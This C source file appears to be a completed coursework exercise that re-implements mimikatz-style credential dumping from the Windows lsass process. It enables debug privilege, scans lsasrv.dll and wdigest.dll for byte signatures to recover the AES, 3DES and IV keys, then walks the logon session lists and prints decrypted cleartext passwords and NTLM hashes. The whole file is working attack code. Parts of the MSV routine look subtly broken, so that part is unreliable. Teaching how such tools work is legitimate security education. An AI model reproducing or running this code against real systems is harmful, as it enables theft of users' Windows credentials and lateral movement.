
#include "mimikatz.h"
#include <stdio.h>

extern BYTE g_sekurlsa_IV[AES_128_KEY_LENGTH];
extern BYTE g_sekurlsa_AESKey[AES_128_KEY_LENGTH];
extern BYTE g_sekurlsa_3DESKey[DES_3DES_KEY_LENGTH];
extern HANDLE g_hLsass;

/*****************************************************
 *  请将以下函数填写完整，并实现对应的功能              *
 *    - EnableSeDebugPrivilege                       *
 *****************************************************/
 /// 推荐使用API: OpenProcessToken() LookupPrivilegeValueW() AdjustTokenPrivileges()
BOOL EnableSeDebugPrivilege()
{
	HANDLE hToken = NULL;          // access token handle  
	LPCTSTR lpszPrivilege = SE_DEBUG_NAME;  // name of privilege to enable/disable  
	BOOL bEnablePrivilege = TRUE;   // to enable or disable privilege  

	TOKEN_PRIVILEGES tp;
	LUID luid;

	// Open the process token
	if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		printf("OpenProcessToken error: %u\n", GetLastError());
		return FALSE;
	}

	if (!LookupPrivilegeValue(
		NULL,            // lookup privilege on local system  
		lpszPrivilege,   // privilege to lookup   
		&luid))          // receives LUID of privilege  
	{
		printf("LookupPrivilegeValue error: %u\n", GetLastError());
		CloseHandle(hToken);
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	// Enable the privilege or disable all privileges.  
	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		printf("AdjustTokenPrivileges error: %u\n", GetLastError());
		CloseHandle(hToken);
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
	{
		printf("The token does not have the specified privilege. \n");
		CloseHandle(hToken);
		return FALSE;
	}

	CloseHandle(hToken);
	return TRUE;
}


/*****************************************************
 *  请将以下的三个函数填写完整，并实现对应的功能         *
 *    - LocateUnprotectLsassMemoryKeys               *
 *	  - GetCredentialsFromMSV                        *
 *	  - GetCredentialsFromWdigest                    *
 *****************************************************/

 /// 从 lsass.exe 内存中读取出后续对凭据进行AES解密或是3DES解密使用的密钥
 /// 设置相应的全局变量 g_sekurlsa_IV g_sekurlsa_AESKey g_sekurlsa_3DESKey
 /// 推荐API: SearchPattern() ReadFromLsass()
VOID LocateUnprotectLsassMemoryKeys() {
	DWORD keySigOffset = 0;
	DWORD aesOffset = 0;
	KIWI_BCRYPT_HANDLE_KEY hAesKey;
	KIWI_BCRYPT_KEY81 extractedAesKey;
	PVOID keyPointer = NULL;

	// 将lsass.exe所加载的模块lsasrv.dll加载入当前进程的内存空间中
	// 其所加载的基地址 lsasrvBaseAddress 与 lsass.exe 进程中 lsasrv.dll 模块的基地址是相同的
	// （同一个DLL模块在不同进程中会被加载到同一地址， ALSR 随机化不影响此行为）
	PUCHAR lsasrvBaseAddress = (PUCHAR)LoadLibraryA("lsasrv.dll");

	// lsasrv.dll 模块中的全局变量 hAesKey 是一个指向实际AES密钥的结构体指针，接下来定位hAesKey在lsass.exe进程中的地址

	// 以下硬编码的字节序列签名在Windows 10与Windows 11上测试可用，非Win10、Win11可能失效
	UCHAR keyAESSig[] = { 0x83, 0x64, 0x24, 0x30, 0x00,
						0x48, 0x8d, 0x45, 0xe0,
						0x44, 0x8b, 0x4d, 0xd8,
						0x48, 0x8d, 0x15 };

	// lsasrv.dll 中 keyAESSig 字节序列所对应的指令反汇编，其中 99 2C 10 00 (小端数 0x102c99)
	// 为全局变量 hAesKey 所在地址相对下一条指令地址0x1800752BF的偏移
	// 故 hAesKey 结构体所在的地址为 0x1800752BF + 0x102c99 = 0x180177F58
	// .text:00000001800752AB 83 64 24 30 00          and     [rsp+70h+var_40], 0
	// .text:00000001800752B0 48 8D 45 E0             lea     rax, [rbp + pbBuffer]
	// .text:00000001800752B4 44 8B 4D D8             mov     r9d, dword ptr[rbp + var_28]; cbKeyObject
	// .text:00000001800752B8 48 8D 15 99 2C 10 00    lea     rdx, ? hAesKey; phKey
	// 
	// .text:00000001800752BF 48 8B 0D 9A 2C 10 00    mov     rcx, cs:?hAesProvider ; hAlgorithm
	//       ^^^^^^^^^^^^^^^^ 注释中出现的绝对地址 0x1800752BF 等以 win11的lsasrv.dll 为例，下同

	// 在lsass进程的内存中搜索定位全局变量hAesKey的内存位置
	// 获取首条指令 and [rsp+70h+var_40], 0 相对lsasrv.dll模块基址的偏移
	keySigOffset = SearchPattern(lsasrvBaseAddress, keyAESSig, sizeof keyAESSig);
	wprintf(L"keySigOffset = 0x%x\n", keySigOffset);	// 0x752AB (00000001800752AB & 0xFFFFF)
	if (keySigOffset == 0) return;

	// 从lsass进程的内存位置lsasrvBaseAddress + keySigOffset + sizeof keyAESSig 上读取4字节的偏移
	//                     0x180000000       + 0x752AB      + 16              = 0x1800752bb
	// *(DWORD *)(0x1800752bb) = 0x102c99
	ReadFromLsass(lsasrvBaseAddress + keySigOffset + sizeof keyAESSig, &aesOffset, sizeof aesOffset);
	wprintf(L"aesOffset = 0x%x\n", aesOffset);	// 0x102c99
	//			0x1800752bb↘
	//				48 8D 15 99 2C 10 00    lea     rdx, ? hAesKey; phKey
	// 0x1800752B8↗         ^^ ^^ ^^ ^^


	// 从lsass进程的内存位置lsasrvBaseAddress + keySigOffset + sizeof keyAESSig + 4 + aesOffset 上读取8字节的数据
	//                     0x180000000       + 0x752AB      + 16              + 4 + 0x102c99  = 0x180177f58
	//
	// .data:0000000180177F58 ?? ?? ?? ?? ?? ?? ?? ?? ?hAesKey@@3PEAXEA dq ?
	// 所读取的8字节的数据是一个指向结构体 KIWI_BCRYPT_HANDLE_KEY 的指针
	ReadFromLsass(lsasrvBaseAddress + keySigOffset + sizeof keyAESSig + 4 + aesOffset, &keyPointer, sizeof keyPointer);
	wprintf(L"keyPointer = 0x%p\n", keyPointer); // 形如 0x000002318B910230
	//                       ^ 由于内存以16字节对齐，故最后4bit必为0

	// 从lsass进程的内存位置 keyPointer 读取出结构题的实际内容
	// 由于 keyPointer 未知，该实际内容已无法使用IDA Pro通过静态分析得到
	ReadFromLsass(keyPointer, &hAesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY));

	// 读取 KIWI_BCRYPT_HANDLE_KEY 结构体中类型为 PKIWI_BCRYPT_KEY81 的成员变量指针所指向的 KIWI_BCRYPT_KEY81 结构体
	// AES DES 密钥均使用 KIWI_BCRYPT_KEY81 结构体包裹
	ReadFromLsass(hAesKey.key, &extractedAesKey, sizeof(KIWI_BCRYPT_KEY81));

	// KIWI_BCRYPT_KEY81 中 hardkey.data包含密钥字节内容， hardkey.cbSecret包含密钥的长度
	memcpy(g_sekurlsa_AESKey, extractedAesKey.hardkey.data, extractedAesKey.hardkey.cbSecret);

	wprintf(L"AES Key Located (len %d): ", extractedAesKey.hardkey.cbSecret);
	HexdumpBytesPacked(extractedAesKey.hardkey.data, extractedAesKey.hardkey.cbSecret);

	/// ... 请修改

	/// 从lsass进程的内存中读取出3DES密钥g_sekurlsa_3DESKey
	DWORD desOffset = 0;
	KIWI_BCRYPT_HANDLE_KEY h3DesKey;
	KIWI_BCRYPT_KEY81 extracted3DesKey;

	// .text:0000000180056970 83 64 24 30 00		  and [rsp + 70h + var_40], 0
	// .text:0000000180056975 48 8D 45 E0             lea     rax, [rbp + pbBuffer]
	// .text:0000000180056979 44 8B 4D D4             mov     r9d, dword ptr[rbp + pbOutput]; cbKeyObject
	// .text:000000018005697D 48 8D 15 34 0D 13 00    lea     rdx, ? h3DesKey@@3PEAXEA; phKey
	// .text:0000000180056984 48 8B 0D 3D 0D 13 00    mov     rcx, cs: ? h3DesProvider@@3PEAXEA; hAlgorithm
	
	UCHAR key3DESSig[] = { 0x83, 0x64, 0x24, 0x30, 0x00,
						0x48, 0x8d, 0x45, 0xe0,
						0x44, 0x8b, 0x4d, 0xd4,
						0x48, 0x8d, 0x15 };
	
	keySigOffset = SearchPattern(lsasrvBaseAddress, key3DESSig, sizeof key3DESSig);
	wprintf(L"keySigOffset = 0x%x\n", keySigOffset);	// 0x56970 (0000000180056970 & 0xFFFFF)
	if (keySigOffset == 0) return;

	// 从lsass进程的内存位置lsasrvBaseAddress + keySigOffset + sizeof key3DESSig 上读取4字节的偏移
	//                     0x180000000       + 0x56970      + 16              = 0x1800056980
	// *(DWORD *)(0x1800056980) = 0x130D34
	ReadFromLsass(lsasrvBaseAddress + keySigOffset + sizeof key3DESSig, &desOffset, sizeof desOffset);
	wprintf(L"desOffset = 0x%x\n", desOffset);	// 0x130D34
	
	// 从lsass进程的内存位置lsasrvBaseAddress + keySigOffset + sizeof key3DESSig + 4 + desOffset 上读取8字节的数据
	//                     0x180000000       + 0x56970      + 16              + 4 + 0x130D34  = 0x1800056A8C
	// .data:0000000180056A8C ?? ?? ?? ?? ?? ?? ?? ?? ?h3DesKey@@3PEAXEA dq ?
	// 所读取的8字节的数据是一个指向结构体 KIWI_BCRYPT_HANDLE_KEY 的指针
	ReadFromLsass(lsasrvBaseAddress + keySigOffset + sizeof key3DESSig + 4 + desOffset, &keyPointer, sizeof keyPointer);
	wprintf(L"keyPointer = 0x%p\n", keyPointer); // 形如 0x000002318B910230
	
	// 从lsass进程的内存位置 keyPointer 读取出结构题的实际内容
	ReadFromLsass(keyPointer, &h3DesKey, sizeof(KIWI_BCRYPT_HANDLE_KEY));

	// 读取 KIWI_BCRYPT_HANDLE_KEY 结构体中类型为 PKIWI_BCRYPT_KEY81 的成员变量指针所指向的 KIWI_BCRYPT_KEY81 结构体
	// AES DES 密钥均使用 KIWI_BCRYPT_KEY81 结构体包裹
	ReadFromLsass(h3DesKey.key, &extracted3DesKey, sizeof(KIWI_BCRYPT_KEY81));

	// KIWI_BCRYPT_KEY81 中 hardkey.data包含密钥字节内容， hardkey.cbSecret包含密钥的长度
	memcpy(g_sekurlsa_3DESKey, extracted3DesKey.hardkey.data, extracted3DesKey.hardkey.cbSecret);

	wprintf(L"3Des Key Located (len %d): ", extracted3DesKey.hardkey.cbSecret);
	HexdumpBytesPacked(extracted3DesKey.hardkey.data, extracted3DesKey.hardkey.cbSecret);


	/// 从lsass进程的内存中读取出IV(InitializationVector): g_sekurlsa_IV
	DWORD ivOffset = 0;
	BYTE InitializationVector[16];

	// .text:0000000180056A10 78 4D                   js      short loc_180056A5F
	// .text:0000000180056A12 44 8D 4E F2             lea     r9d, [rsi - 0Eh]; dwFlags
	// .text:0000000180056A16 44 8B C6                mov     r8d, esi; cbBuffer
	// .text:0000000180056A19 48 8D 15 80 0C 13 00    lea     rdx, ? InitializationVector@@3PAEA; pbBuffer
	// .text:0000000180056A20 33 C9					  xor ecx, ecx; hAlgorithm

	UCHAR keyIVSig[] = { 0x78, 0x4D,
						0x44, 0x8D, 0x4E, 0xF2,
						0x44, 0x8B, 0xC6,
						0x48, 0x8D, 0x15 };

	// 搜索IV特征码
	DWORD ivSigOffset = SearchPattern(lsasrvBaseAddress, keyIVSig, sizeof keyIVSig);
	if (ivSigOffset == 0) return;

	// 读取4字节偏移
	ReadFromLsass(lsasrvBaseAddress + ivSigOffset + sizeof keyIVSig, &ivOffset, sizeof ivOffset);

	// 计算IV全局变量地址
	PUCHAR ivAddress = lsasrvBaseAddress + ivSigOffset + sizeof keyIVSig + 4 + ivOffset;

	// 直接读取16字节IV数据
	ReadFromLsass(ivAddress, g_sekurlsa_IV, sizeof(g_sekurlsa_IV));
	wprintf(L"IV Located: ");
	HexdumpBytesPacked(g_sekurlsa_IV, sizeof(g_sekurlsa_IV));
}


/// 导出Wdigest缓存在内存中的明文密码
VOID GetCredentialsFromWdigest() {
	KIWI_WDIGEST_LIST_ENTRY entry;
	DWORD logSessListSigOffset, logSessListOffset;
	PKIWI_WDIGEST_LIST_ENTRY logSessListAddr = NULL, pList;
	WCHAR passDecrypted[1024];

	PUCHAR wdigestBaseAddress = (PUCHAR)LoadLibraryA("wdigest.dll");

	/// ... 请修改

	// .text:000000018001A467 48 FF 15 52 55 01 00    call    cs : __imp_RtlEnterCriticalSection
	// .text:000000018001A46E 0F 1F 44 00 00          nop     dword ptr[rax + rax + 00h]
	// .text:000000018001A473 48 8B 1D C6 B9 01 00    mov     rbx, cs: ? l_LogSessList@@3U_LIST_ENTRY@@A; _LIST_ENTRY l_LogSessList
	// .text:000000018001A47A 48 8D 0D BF B9 01 00    lea     rcx, ? l_LogSessList@@3U_LIST_ENTRY@@A; _LIST_ENTRY l_LogSessList
	// .text:000000018001A481 48 3B D9                cmp     rbx, rcx

	UCHAR keySig[] = { 0x48, 0xFF, 0x15, 0x52, 0x55, 0x01, 0x00,
						0x0F, 0x1F, 0x44, 0x00, 0x00,
						0x48, 0x8B, 0x1D, 0xC6, 0xB9, 0x01, 0x00,
						0x48, 0x8D, 0x0D };

	// 搜索Wdigest特征码
	logSessListSigOffset = SearchPattern(wdigestBaseAddress, keySig, sizeof keySig);
	if (logSessListSigOffset == 0) return;

	// 读取4字节偏移
	ReadFromLsass(wdigestBaseAddress + logSessListSigOffset + sizeof keySig, &logSessListOffset, sizeof logSessListOffset);
	wprintf(L"logSessListOffset = 0x%x\n", logSessListOffset);

	// 计算logSessListAddr全局变量地址
	ReadFromLsass(wdigestBaseAddress + logSessListSigOffset + sizeof keySig + 4 + logSessListOffset, &logSessListAddr, sizeof logSessListAddr);
	wprintf(L"logSessListAddr = 0x%p\n", logSessListAddr);

	// 读取logSessListAddr指向的结构体内容
	ReadFromLsass(logSessListAddr, &entry, sizeof(KIWI_WDIGEST_LIST_ENTRY));
	pList = entry.This;

	do {
		memset(&entry, 0, sizeof(entry));
		ReadFromLsass(pList, &entry, sizeof(KIWI_WDIGEST_LIST_ENTRY));

		if (entry.UsageCount == 1) {
			UNICODE_STRING* username = ExtractUnicodeString((PUNICODE_STRING)(
				(PUCHAR)pList + offsetof(KIWI_WDIGEST_LIST_ENTRY, UserName)
				));
			UNICODE_STRING* password = ExtractUnicodeString((PUNICODE_STRING)(
				(PUCHAR)pList + offsetof(KIWI_WDIGEST_LIST_ENTRY, Password)
				));

			if (username != NULL && username->Length != 0) wprintf(L"Username: %ls\n", username->Buffer);
			else wprintf(L"Username: [NULL]\n");

			// Check if password is present
			if (password->Length != 0 && (password->Length % 2) == 0) {
				// Decrypt password using recovered AES/3Des keys and IV
				if (DecryptCredentials((char*)password->Buffer, password->MaximumLength,
					(PUCHAR)passDecrypted, sizeof(passDecrypted)) > 0) {
					wprintf(L"Password: %ls\n\n", passDecrypted);
				}
			}
			else {
				printf("Password: [NULL]\n\n");
			}

		}
		pList = entry.Flink;
	} while (pList != logSessListAddr);
	return;
}


/// 推荐使用API: 
///		LoadLibraryA() 
///		SearchPattern() 
///		ReadFromLsass() 
///		DecryptCredentials() 
///		ExtractUnicodeString()
/// 推荐使用结构体: 
///		KIWI_MSV1_0_LIST_63
///		KIWI_MSV1_0_CREDENTIALS 
///		KIWI_MSV1_0_PRIMARY_CREDENTIALS
VOID GetCredentialsFromMSV() {
	DWORD keySigOffset = 0;
	KIWI_MSV1_0_LIST_63 entry;
	DWORD logSessListSigOffset, LogonSessionListOffset;
	PKIWI_MSV1_0_LIST_63 logSessListAddr = NULL;	// List Header

	/// ... 请修改

	// .text:00000001800BF83A 48 FF 15 27 3C 08 00    call    cs:__imp_RtlAcquireResourceShared
	// .text:00000001800BF841 0F 1F 44 00 00          nop     dword ptr[rax + rax + 00h]
	// .text:00000001800BF846 48 C1 E3 04             shl     rbx, 4
	// .text:00000001800BF84A 4D 8D B7 C0 62 18 00    lea     r14, rva ? LogonSessionList@@3PAU_LIST_ENTRY@@A[r15]; _LIST_ENTRY near* LogonSessionList
	// .text:00000001800BF851 4C 03 F3                add     r14, rbx

	PUCHAR lsasrvBaseAddress = (PUCHAR)LoadLibraryA("lsasrv.dll");

	UCHAR keySig[] = {	0x48, 0xFF, 0x15, 0x27, 0x3C, 0x08, 0x00,
						0x0F, 0x1F, 0x44, 0x00, 0x00,
						0x48, 0xC1, 0xE3, 0x04,
						0x4D, 0x8D, 0xB7 };

	keySigOffset = SearchPattern(lsasrvBaseAddress, keySig, sizeof keySig);
	if (keySigOffset == 0) return;
	wprintf(L"keySigOffset = 0x%x\n", keySigOffset);

	// 读取LogonSessionList的RVA
	ReadFromLsass(lsasrvBaseAddress + keySigOffset + sizeof(keySig), &LogonSessionListOffset, sizeof(LogonSessionListOffset));
	wprintf(L"LogonSessionListOffset = 0x%x\n", LogonSessionListOffset);

	// 计算全局变量LogonSessionList的地址
	logSessListAddr = (PKIWI_MSV1_0_LIST_63)(lsasrvBaseAddress + LogonSessionListOffset);
	wprintf(L"logSessListAddr = 0x%p\n", logSessListAddr);

	PKIWI_MSV1_0_LIST_63 pList = logSessListAddr;

	do {
		KIWI_MSV1_0_LIST_63 listEntry;
		KIWI_MSV1_0_CREDENTIALS credentials;

		// 最终输出：
		// wprintf(L"Username: %ls\n", );
		// wprintf(L"NTLMHash: %ls\n\n", );

		memset(&listEntry, 0, sizeof(listEntry));
		ReadFromLsass(pList, &listEntry, sizeof(KIWI_MSV1_0_LIST_63));

		bool readOk = ReadFromLsass(pList, &listEntry, sizeof(KIWI_MSV1_0_LIST_63));

		// 读取凭据链表头
		PKIWI_MSV1_0_CREDENTIALS credPtr = listEntry.Credentials;
		//wprintf(L"Credentials List Address: 0x%p\n", credPtr);

		while (credPtr) {
			KIWI_MSV1_0_CREDENTIALS credentials;
			memset(&credentials, 0, sizeof(credentials));
			ReadFromLsass(credPtr, &credentials, sizeof(KIWI_MSV1_0_CREDENTIALS));

			if (credentials.PrimaryCredentials) {
				PKIWI_MSV1_0_PRIMARY_CREDENTIALS primaryCredPtr = (PKIWI_MSV1_0_PRIMARY_CREDENTIALS)credentials.PrimaryCredentials;
				KIWI_MSV1_0_PRIMARY_CREDENTIALS primaryCred;
				ReadFromLsass(primaryCredPtr, &primaryCred, sizeof(KIWI_MSV1_0_PRIMARY_CREDENTIALS));

				// 读取加密的凭据缓冲区
				LSA_UNICODE_STRING* credStr = &primaryCred.Credentials;

				if (credStr->Length && credStr->Buffer) {
					WCHAR passDecrypted[1024];

					LSA_UNICODE_STRING* username = ExtractUnicodeString((PUNICODE_STRING)(
						(PUCHAR)pList + offsetof(KIWI_MSV1_0_LIST_63, UserName)
						));

					if (username != NULL && username->Length != 0) wprintf(L"Username: %ls\n", username->Buffer);
					else wprintf(L"Username: [NULL]\n");

					// 假设decryptedCreds已填充，且长度足够
					typedef struct _MSV1_0_PRIMARY_CREDENTIAL_USER_BUFFER {
						LSA_UNICODE_STRING LogonDomainName;
						LSA_UNICODE_STRING UserName;
						LSA_UNICODE_STRING Domaine;
						LSA_UNICODE_STRING NtOwfPassword;
						// ... 其他字段
					} MSV1_0_PRIMARY_CREDENTIAL_USER_BUFFER, * PMSV1_0_PRIMARY_CREDENTIAL_USER_BUFFER;

					BYTE encryptedCreds[8192] = { 0 };
					ReadFromLsass(credStr->Buffer, encryptedCreds, credStr->Length);
					BYTE decryptedCreds[8192] = { 0 };
					DecryptCredentials((char*)encryptedCreds, credStr->Length, decryptedCreds, sizeof(decryptedCreds));
					HexdumpBytesPacked((PUCHAR)decryptedCreds, 64);
					PMSV1_0_PRIMARY_CREDENTIAL_USER_BUFFER pUserBuf = (PMSV1_0_PRIMARY_CREDENTIAL_USER_BUFFER)decryptedCreds;

					LSA_UNICODE_STRING* UserName = ExtractUnicodeString((PUNICODE_STRING)(
						(PUCHAR)pUserBuf + offsetof(MSV1_0_PRIMARY_CREDENTIAL_USER_BUFFER, UserName)
						));
					if (UserName->Length != 0 && UserName->Buffer) {
						wprintf(L"UserName->Length: %d\n", UserName->Length);
						wprintf(L"Username: %ls\n", UserName->Buffer);
					}
					else {
						wprintf(L"Username: [NULL]\n");
					}

					LSA_UNICODE_STRING* NtOwfPassword = ExtractUnicodeString((PUNICODE_STRING)(
						(PUCHAR)pUserBuf + offsetof(MSV1_0_PRIMARY_CREDENTIAL_USER_BUFFER, NtOwfPassword)
						));

					if (NtOwfPassword->Length != 0 && NtOwfPassword->Buffer) {
						// Decrypt password using recovered AES/3Des keys and IV
						if (DecryptCredentials((char*)NtOwfPassword->Buffer, NtOwfPassword->MaximumLength,
							(PUCHAR)passDecrypted, sizeof(passDecrypted)) > 0) {
							wprintf(L"Password: %ls\n\n", passDecrypted);
						}
					}
					else {
						wprintf(L"NTLMHash: [NULL]\n\n");
					}

				}
			}
			credPtr = credentials.next;
		}
		pList = listEntry.Flink;
	} while (pList != logSessListAddr);
}